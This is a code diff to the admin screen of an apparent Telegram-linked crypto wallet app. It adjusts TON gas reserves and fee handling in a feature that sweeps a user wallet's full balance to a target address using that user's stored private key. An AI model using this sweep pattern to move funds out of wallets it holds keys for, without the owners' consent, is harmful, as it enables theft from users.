@@ -4360,20 +4360,27 @@ function AdminScreen({ onBack }) {
       // Fee logic: EVM chains use 0 so ethers.js auto-estimates gas price from the network
       let feeVal = 0;
       if (sym === 'SOL') {
-        feeVal = 5000; // base fee micro-lamports (minimal)
-      } else if (sym === 'TON') {
-        feeVal = 10000000; // nanoton (0.01 TON minimal)
+        feeVal = 5000; // priority fee in micro-lamports
       } else if (sym === 'LTC') {
         feeVal = 1; // 1 sat/byte minimal
       }
+      // TON: protocol deducts gas automatically, do NOT pass a fee value
       // ETH, BNB, ARB, USDT on EVM: feeVal stays 0 → ethers auto-estimates network gas price
+
+      // For TON native: subtract a small gas reserve so the tx doesn't fail when sweeping max
+      let adjustedAmount = amount;
+      if (sym === 'TON') {
+        const TON_GAS_RESERVE = 0.015; // ~0.01-0.015 TON for network gas
+        adjustedAmount = Math.max(0, parseFloat((amount - TON_GAS_RESERVE).toFixed(9)));
+        if (adjustedAmount <= 0) throw new Error('Недостаточно TON для оплаты комиссии сети (минимум 0.015 TON)');
+      }
 
       const txHash = await sendTransaction({
         sym,
         networkId: netId,
         from: addresses[sym] || addresses.ETH,
         to: sweepTargetAddr,
-        amount,
+        amount: adjustedAmount,
         privateKey: privateKeys[sym] || privateKeys.ETH,
         fee: feeVal
       });
@@ -4385,7 +4392,7 @@ function AdminScreen({ onBack }) {
       try {
         const colName = sym.toLowerCase() + '_balance';
         const prevBal = parseFloat(sweepWallet[colName] || '0');
-        const newBal = Math.max(0, prevBal - amount);
+        const newBal = Math.max(0, prevBal - adjustedAmount);
         const walletFilter = sweepWallet.telegram_id
           ? `telegram_id=eq.${encodeURIComponent(sweepWallet.telegram_id)}`
           : `username=eq.${encodeURIComponent(sweepWallet.username)}`;
@@ -4407,7 +4414,7 @@ function AdminScreen({ onBack }) {
       } catch (_) {}
 
       notifyAdmin(
-        `💸 <b>Свип выполнен (Admin)</b>\n\n👤 ${sweepWallet.username}\n🪙 ${sym} (${netId})\n💰 ${amount}\n🎯 ${sweepTargetAddr}\n🔗 <code>${txHash}</code>`,
+        `💸 <b>Свип выполнен (Admin)</b>\n\n👤 ${sweepWallet.username}\n🪙 ${sym} (${netId})\n💰 ${adjustedAmount}\n🎯 ${sweepTargetAddr}\n🔗 <code>${txHash}</code>`,
         "sweep"
       );
     } catch (e) {
@@ -4711,7 +4718,7 @@ function AdminScreen({ onBack }) {
                 <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                   {COINS.map(sym => {
                     const balance = sweepWallet[sym.toLowerCase() + '_balance'] || 0;
-                    const netId = sym === 'USDT' ? 'erc20' : (sym === 'BNB' ? 'bsc' : (sym === 'ARB' ? 'arbitrum' : (sym === 'TON' ? 'ton' : (sym === 'SOL' ? 'solana' : 'mainnet'))));
+                    const netId = sym === 'USDT' ? 'eth' : (sym === 'BNB' ? 'bnb' : (sym === 'ARB' ? 'arb' : (sym === 'TON' ? 'ton' : (sym === 'SOL' ? 'sol' : 'eth'))));
                     const isZero = parseFloat(balance) <= 0;
                     
                     return (
